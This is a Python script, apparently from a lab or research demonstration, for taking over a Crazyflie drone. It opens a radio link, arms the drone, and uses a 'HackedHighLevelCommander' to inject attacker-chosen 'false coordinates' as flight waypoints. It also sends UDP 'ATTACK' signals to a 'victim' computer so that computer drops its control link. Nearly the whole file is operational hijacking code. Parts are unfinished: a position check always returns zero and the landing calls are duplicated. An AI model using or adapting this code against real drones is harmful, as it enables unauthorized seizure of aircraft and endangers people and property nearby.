import time
import logging
import signal
import sys
import socket
import json
from datetime import datetime
from cflib.crazyflie import Crazyflie
from cflib import crtp
from cflib.crazyflie.swarm import Swarm, CachedCfFactory
from cflib.crazyflie.log import LogConfig

logging.basicConfig(level=logging.INFO)

# Global variable to track drone connections
active_drones = {}

# Network configuration for victim communication
VICTIM_IP = "172.16.151.168" 
VICTIM_PORT = 9999

# Target swarm URIs
SWARM_URIS = [
    "radio://1/80/2M/E7E7E7E7E9"  
]

# Position logging files and trackers
position_files = {}
position_loggers = {}
controller = "ATTACKER-CTRL"

# Global to store current positions for checking
current_positions = {}

def setup_position_logging(cf, uri):
    """Set up position logging to append to existing file"""
    def log_pos_callback(timestamp, data, logconf):
        try:
            x = data['stateEstimate.x']
            y = data['stateEstimate.y']
            z = data['stateEstimate.z']
            
            # Update current position for target checking
            current_positions[uri] = (x, y, z)
            
            # Create position data entry (same format as victim)
            position_data = {
                'timestamp': time.time(),
                'datetime': datetime.now().isoformat(),
                'x': float(x),
                'y': float(y),
                'z': float(z),
                'controller': controller  # Mark as attacker-controlled
            }
            
            # Write to existing drone-specific file
            if uri in position_files:
                with open(position_files[uri], 'a') as f:
                    f.write(json.dumps(position_data) + '\n')
            
        except KeyError as e:
            print(f"Position data missing for {uri}: {e}")
        except Exception as e:
            print(f"Error writing position data for {uri}: {e}")
    
    log_conf = LogConfig(name='Position', period_in_ms=500)  # Same logging rate as victim
    log_conf.add_variable('stateEstimate.x', 'float')
    log_conf.add_variable('stateEstimate.y', 'float')
    log_conf.add_variable('stateEstimate.z', 'float')
    
    try:
        cf.log.add_config(log_conf)
        log_conf.data_received_cb.add_callback(log_pos_callback)
        log_conf.start()
        position_loggers[uri] = log_conf
        
        # Use the same file naming convention as victim
        filename = f"drone_position_{uri.replace('://', '_').replace('/', '_')}.jsonl"
        position_files[uri] = filename
        
        print(f"Attacker position logging started for {uri}")
        print(f"Appending to: {filename}")
        return log_conf
    except Exception as e:
        print(f"❌ Failed to start attacker position logging for {uri}: {e}")
        return None

def stop_position_logging(uri):
    """Stop position logging for a drone"""
    if uri in position_loggers:
        try:
            position_loggers[uri].stop()
            del position_loggers[uri]
            print(f"Attacker position logging stopped for {uri}")
        except Exception as e:
            print(f"Error stopping attacker position logger for {uri}: {e}")

def get_user_coordinates():
    """Specify false coordinates for UAV redirection"""
    print("\nSpecify false coordinates for UAV redirection:")    
    try:
        x = float(input("Enter X coordinate (meters): "))
        y = float(input("Enter Y coordinate (meters): "))
        return x, y
    except ValueError:
        print(" Invalid input! Using default coordinates (0, 0)")
        return 0.0, 0.0

def send_victim_signal(message):
    """Send a signal to the victim computer to disconnect"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(message.encode(), (VICTIM_IP, VICTIM_PORT))
        print(f"Sent signal to victim: {message}")
        sock.close()
        return True
    except Exception as e:
        print(f"Failed to send signal to victim: {e}")
        return False

def emergency_stop(sig=None, frame=None):
    """Emergency stop function that stops all drones immediately on Ctrl+C"""
    print("🛑 EMERGENCY STOP TRIGGERED! Stopping all drones...")
    
    global active_drones
    for uri, cf in active_drones.items():
        try:
            # Stop position logging first
            stop_position_logging(uri)
            
            # Send immediate stop command to cut motors
            cf.commander.send_stop_setpoint()
            print(f"✅ Motors stopped for {uri}")
            
            # Close connection
            cf.close_link()
            print(f"✅ Connection closed for {uri}")
            
        except Exception as e:
            print(f" Error stopping {uri}: {e}")
    
    # Notify victim of emergency stop
    send_victim_signal("EMERGENCY_STOP")
    sys.exit(0)  # Exit the program

# Register the Ctrl+C signal handler
signal.signal(signal.SIGINT, emergency_stop)

def takeover_single_drone(uri):
    """Take over control of a single drone"""
    print(f"⚡ ATTACKER: Connecting to {uri}...")
    
    global active_drones 
    cf_attack = Crazyflie(rw_cache='./cache')
    active_drones[uri] = cf_attack

    cf_attack.open_link(uri)
    time.sleep(2)

    # Start position logging immediately after connection
    #pos_log = setup_position_logging(cf_attack, uri)
    #if not pos_log:
    #    print(f" Failed to start attacker position logging for {uri}")

    cf_attack.platform.send_arming_request(True)
    time.sleep(1.0)
        
    print("⚡ ATTACKER: Taking over control...")
    from cflib.crazyflie.high_level_commander import HackedHighLevelCommander
    commander = HackedHighLevelCommander(cf_attack)
    
    #if send_victim_signal("ATTACKER_READY"):
    #    print("Victim disconnecting")
    #TEST
    #cf_attack.platform.send_arming_request(True)
    #time.sleep(1.0)

    #commander.takeoff(1,6)
    #time.sleep(6) 
    
    print("✅ ATTACKER: Takeover successful!")
    return commander, cf_attack

def check_position_reached(uri, target_x, target_y, tolerance=0.2):
    """Check if drone has reached target position within tolerance"""
    #if uri not in current_positions:
    #    return False
    
    #current_x, current_y, current_z = current_positions[uri]
    #distance = ((current_x - target_x)**2 + (current_y - target_y)**2)**0.5
    #time.sleep(0.3)
    #print (distance)
    #reached = distance <= tolerance
    #time.sleep(0.2)
    #print ("reached:{reached}")
   

    #if not reached:
    #    print(f" Drone {uri} is {distance:.2f}m from target (tolerance: {tolerance}m)")
    #print ("reached:{reached}")
    return 0
#move_time=6
def ensure_drone_reaches_target(mc, uri, target_x, target_y, max_attempts=7, move_time=6, tolerance=0.3):
    """Ensure drone reaches target with simple user prompts"""
    attempt = 1
    
    while attempt:
        print(f"\n Attempt {attempt}/{max_attempts}: Moving to ({target_x:.2f}, {target_y:.2f})")
        
        # Send go_to command
        mc.go_to(target_x, target_y, 1, 0, move_time)
        time.sleep(move_time + 1)
        time.sleep(2)
        # Send attack signal after first attempt
        if attempt >= 2:
            move_time = 3
            #TEST the commenting out
            send_victim_signal("ATTACK")

        
        # Ask user if they want to continue
        if attempt < max_attempts:
            try:
                print("Press ENTER to send same command again? Any other key to land: ")
                choice = input()
                if choice == "":
                    attempt += 1
                    continue
                else:
                    print("🛬 Landing drone as requested...")
                    mc.land(0, 4)
                    time.sleep(4)
                    print("🛬 Landing drone as requested...")
                    mc.land(0, 4)
                    time.sleep(4)
                    return False
            except KeyboardInterrupt:
                print("\n Interrupted - landing drone")
                mc.land(0, 4)
                time.sleep(4)
                return False
        else:
            print("Max default attempt reached, press ENTER if you want more attempts, any other key to land")
            choice=input()
            if choice=="":
                attempt +=1
                continue
            else:
                print(f"⚠️  Max attempts reached - landing drone")
                mc.land(0, 4)
                time.sleep(4)
                mc.land(0, 4)
                time.sleep(4)
                return False
    return False 
    
def __ensure_drone_reaches_target(mc, uri, target_x, target_y, max_attempts=10, move_time=6, tolerance=0.3):
    """Ensure drone reaches target by resending command if needed"""
    attempt = 1
    
    while attempt <= max_attempts:
        print(f" Attempt {attempt}/{max_attempts}: Moving drone to ({target_x}, {target_y})")
        
        # Send go_to command
        mc.go_to(target_x, target_y, 1, 0, move_time)
        
        # Wait for movement to complete
        time.sleep(move_time+1)  # Extra second for stabilization
        time.sleep(2)
        #TEST1
        #if send_victim_signal("ATTACKER_READY"):
        #    print("Victim disconnecting")
        if attempt>=2:
            move_time=3
            if send_victim_signal("ATTACK"):
                print("Victim disconnecting")

        # Check if target reached
        if check_position_reached(uri, target_x, target_y, tolerance):
            print(f"✅ Drone successfully reached target position")
            return True
        else:
            #print(f" Drone did not reach target, retrying...")
            attempt += 1
    
    #print(f"⚠️  Drone failed to reach target after {max_attempts} attempts")
    return False

def swarm_takeover_control():
    """Take over control of the entire swarm"""
    global active_drones

    commanders = []
    successful_takeovers = []
    cfs = []
    
    # Get target coordinates from user
    target_x, target_y = get_user_coordinates()
    print(f"Injecting malicious waypoints into the flight controller to compromise the navigation stack: X={target_x}, Y={target_y}")

    # Take over each drone in the swarm
    for uri in SWARM_URIS:
        mc, cf = takeover_single_drone(uri)
        if mc and cf:    
            cfs.append(cf)
            commanders.append(mc)
            successful_takeovers.append(uri)
        #time.sleep(1)  # Stagger connections to avoid radio congestion
        
    if not successful_takeovers:
        print("No drones were successfully taken over")
        return
    
    try:
        
        # Perform coordinated swarm maneuvers to user-specified coordinates
        print("➡ Moving drones to target coordinates...")
        for i, mc in enumerate(commanders):
            uri = successful_takeovers[i]
            print(f"\n Moving {uri} to target...")
            success = ensure_drone_reaches_target(mc, uri, target_x, target_y)
            time.sleep(5) #test was 3
            if not success:
                print(f"⚠️  Continuing with landing")
        time.sleep(2) #test it was 1
        # Land all drones
        #if send_victim_signal("ATTACKER_READY"):
        #    print("Victim disconnecting")

        print("\n⬇ Landing swarm...")
        for mc in commanders:
            #attempt=2
            #mc.land(0, 4)
            #if send_victim_signal("ATTACKER_READY"):
            #    print("Victim disconnecting")
            #while attempt>=0:
            mc.land(0,4)
            time.sleep(4)
                
        #if send_victim_signal("ATTACKER_READY"):
        #    print("Victim disconnecting")
        
        print("\n⬇ Landing swarm...")
        for mc in commanders:
            #attempt=2  
            #mc.land(0, 4)  
            #if send_victim_signal("ATTACKER_READY"):
            #    print("Victim disconnecting")
            #while attempt>=0:
            mc.land(0,4) 
            time.sleep(4)

        # Stop motors and close connections
        for cf in cfs:
            cf.commander.send_stop_setpoint()
            time.sleep(0.1)
            cf.close_link()
        
        # Stop all position logging
        #for uri in successful_takeovers:
            #stop_position_logging(uri)
        
        # Signal mission completion to victim
        #time.sleep(2)
        send_victim_signal("ATTACKER_READY")
        print("✅ Swarm attack completed successfully!")
        
    except Exception as e:
        print(f" Swarm maneuver error: {e}")
        # Stop position logging on error
        for uri in successful_takeovers:
            stop_position_logging(uri)
        send_victim_signal("SWARM_ATTACK_FAILED")
    
    # Clean up all connections
    for uri in list(active_drones.keys()):
        try:
            if active_drones[uri].is_connected():
                active_drones[uri].commander.send_stop_setpoint()
                active_drones[uri].close_link()
                del active_drones[uri]
        except Exception as e:
            print(f"⚠ Error cleaning up {uri}: {e}")

if __name__ == "__main__":
    print(" SWARM ATTACKER COMPUTER - Interactive Multi-Drone Takeover Control")
    print("=====================================================================")
    print("⚠  Press Ctrl+C at any time for emergency stop")
    print(f" Target URIs: {SWARM_URIS}")
    print(" You will be prompted to enter target coordinates during the attack")
    print("")
    
    crtp.init_drivers()
    swarm_takeover_control()
